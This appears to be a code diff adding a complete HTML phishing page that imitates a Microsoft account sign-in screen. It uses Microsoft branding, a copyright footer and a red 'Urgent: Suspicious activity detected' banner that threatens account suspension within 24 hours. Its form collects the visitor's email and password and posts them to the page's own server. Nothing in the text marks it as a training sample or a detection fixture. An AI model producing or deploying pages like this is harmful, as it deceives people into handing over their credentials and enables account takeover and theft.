@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>👤</text></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: "Segoe UI",SegoeUI,"Segoe UI Web (West European)",Segoe,"Segoe Symbol",sans-serif;
+            background: linear-gradient(135deg, #f3f2f1 0%, #e9e8e7 100%);
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+        }
+        .login-container { 
+            background: white; 
+            width: 100%; 
+            max-width: 420px; 
+            margin: 0 20px; 
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .header { 
+            background: #fff; 
+            padding: 24px 32px 0; 
+            border-bottom: 1px solid #edebe9;
+        }
+        .logo { 
+            color: #0078d4; 
+            font-size: 28px; 
+            font-weight: 600; 
+            margin-bottom: 8px;
+        }
+        .subtitle { color: #605e5c; font-size: 18px; margin-bottom: 24px; }
+        .form-section { padding: 32px; }
+        .urgency { 
+            background: linear-gradient(135deg, #fed9cc 0%, #fbc5b6 100%);
+            border: 1px solid #f26330; 
+            border-radius: 6px; 
+            padding: 16px; 
+            margin-bottom: 24px;
+        }
+        .urgency-icon { font-size: 20px; margin-right: 8px; }
+        .urgency-text { font-weight: 600; color: #d13438; font-size: 16px; }
+        .input-group { margin-bottom: 16px; }
+        input { 
+            width: 100%; 
+            padding: 14px 16px; 
+            border: 1px solid #edebe9; 
+            border-radius: 6px; 
+            font-size: 16px; 
+            transition: border-color 0.2s;
+        }
+        input:focus { outline: none; border-color: #0078d4; box-shadow: 0 0 0 2px rgba(0,120,212,0.2); }
+        input::placeholder { color: #a19f9d; }
+        .submit-btn { 
+            width: 100%; 
+            padding: 14px; 
+            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            font-size: 18px; 
+            font-weight: 600; 
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .submit-btn:hover { background: linear-gradient(135deg, #106ebe 0%, #005a9e 100%); transform: translateY(-1px); }
+        .footer { 
+            text-align: center; 
+            padding: 24px 32px; 
+            border-top: 1px solid #edebe9;
+            font-size: 12px; 
+            color: #605e5c;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <div class="logo">Microsoft Account</div>
+            <div class="subtitle">Sign in to continue</div>
+        </div>
+        
+        <div class="form-section">
+            <div class="urgency">
+                <div class="urgency-text">Urgent: Suspicious activity detected</div>
+                <div style="font-size: 14px; margin-top: 4px; color: #d13438;">
+                    Verify your identity now or account access will be suspended within 24 hours.
+                </div>
+            </div>
+            
+            <form method="POST">
+                <div class="input-group">
+                    <input name="username" type="email" placeholder="someone@example.com" required autocomplete="email">
+                </div>
+                <div class="input-group">
+                    <input name="password" type="password" placeholder="Password" required autocomplete="current-password">
+                </div>
+                <button class="submit-btn" type="submit">Verify Account</button>
+            </form>
+        </div>
+        
+        <div class="footer">
+            © 2026 Microsoft Corporation
+        </div>
+    </div>
+</body>
+</html>
